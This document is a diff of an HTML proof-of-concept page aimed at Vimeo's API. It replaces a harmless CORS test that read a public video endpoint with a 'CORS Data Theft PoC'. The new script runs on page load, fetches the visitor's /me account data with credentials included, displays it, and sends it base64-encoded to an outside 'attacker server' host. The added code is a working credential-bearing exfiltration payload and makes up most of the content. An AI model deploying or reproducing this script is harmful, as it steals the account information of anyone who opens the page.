@@ -1,23 +1,26 @@
 <!DOCTYPE html>
 <html>
-  <head><title>Vimeo CORS Misconfig PoC</title></head>
-  <body>
-    <h1>Vimeo CORS Misconfiguration Test</h1>
-    <pre id="output">Loading...</pre>
-    <script>
-      async function test() {
-        try {
-          // public endpoint (safe demo)
-          const res = await fetch("https://api.vimeo.com/videos/76979871", {
-            credentials: "include"
-          });
-          const data = await res.json();
-          document.getElementById("output").innerText = JSON.stringify(data, null, 2);
-        } catch (e) {
-          document.getElementById("output").innerText = "Error: " + e;
-        }
-      }
-      test();
-    </script>
-  </body>
+<body>
+<h1>CORS Data Theft PoC</h1>
+<pre id="output"></pre>
+<script>
+(async () => {
+  try {
+    // Grab victim’s account info
+    const resp = await fetch("https://api.vimeo.com/me", {
+      credentials: "include"
+    });
+    const text = await resp.text();
+
+    // Show it on screen (proof you can read it)
+    document.getElementById("output").innerText = text;
+
+    // Exfiltrate to attacker server (replace with your endpoint)
+    await fetch("https://russianyandexshop.github.io/view/log?d=" + encodeURIComponent(btoa(text)));
+  } catch (e) {
+    document.getElementById("output").innerText = "Error: " + e;
+  }
+})();
+</script>
+</body>
 </html>
